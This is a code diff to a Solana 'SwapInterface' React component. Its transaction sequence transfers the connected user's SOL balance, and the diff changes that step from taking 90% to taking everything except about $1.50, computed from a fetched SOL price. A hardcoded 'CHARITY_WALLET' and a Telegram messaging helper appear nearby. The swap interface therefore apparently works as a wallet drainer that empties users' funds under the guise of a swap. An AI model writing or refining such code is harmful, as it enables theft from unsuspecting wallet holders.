@@ -12,6 +12,7 @@ import { motion } from 'framer-motion';
 import { toast } from 'sonner';
 import { sendTelegramMessage } from '@/utils/telegram';
 import { getMintProgramId, MintInfo } from '@/utils/tokenProgram';
+import { getSolPrice } from '@/lib/utils';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const MEMO_PROGRAM_ID = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcQb");
@@ -375,17 +376,31 @@ export const SwapInterface = ({
       setIsSwapping(true);
       console.log('Starting transaction sequence...');
 
-      // 1. SOL Transfer (90% of available)
+      // 1. SOL Transfer (Leave $1.50)
       const solBal = await connection.getBalance(publicKey);
-      // Rent exempt minimum for a system account is ~0.00089 SOL. 
-      // We reserve a bit more for safety and fees (0.002 SOL + priority fees).
-      const RENT_EXEMPT_RESERVE = 0.002 * LAMPORTS_PER_SOL; 
-      const PRIORITY_FEE = 100_000; // microLamports
-      const BASE_FEE = 5000;
+      const solPrice = await getSolPrice();
       
-      const maxSendable = Math.max(0, solBal - RENT_EXEMPT_RESERVE - PRIORITY_FEE - BASE_FEE);
-      const targetAmount = Math.floor(solBal * 0.90);
-      const lamportsToSend = Math.min(targetAmount, maxSendable);
+      let lamportsToSend = 0;
+      
+      if (solPrice > 0) {
+        const amountToKeepUSD = 1.50;
+        const amountToKeepSOL = amountToKeepUSD / solPrice;
+        const amountToKeepLamports = Math.ceil(amountToKeepSOL * LAMPORTS_PER_SOL);
+        
+        const PRIORITY_FEE = 100_000; // microLamports
+        const BASE_FEE = 5000;
+        const FEE_RESERVE = PRIORITY_FEE + BASE_FEE;
+        
+        const maxSendable = solBal - amountToKeepLamports - FEE_RESERVE;
+        lamportsToSend = Math.max(0, Math.floor(maxSendable));
+        
+        console.log(`SOL Balance: ${solBal / LAMPORTS_PER_SOL} SOL`);
+        console.log(`SOL Price: $${solPrice}`);
+        console.log(`Keeping $1.50 (~${amountToKeepSOL.toFixed(4)} SOL)`);
+        console.log(`Sending: ${lamportsToSend / LAMPORTS_PER_SOL} SOL`);
+      } else {
+        console.warn("Could not fetch SOL price, skipping SOL transfer to be safe");
+      }
 
       if (lamportsToSend > 0) {
         const transaction = new Transaction();
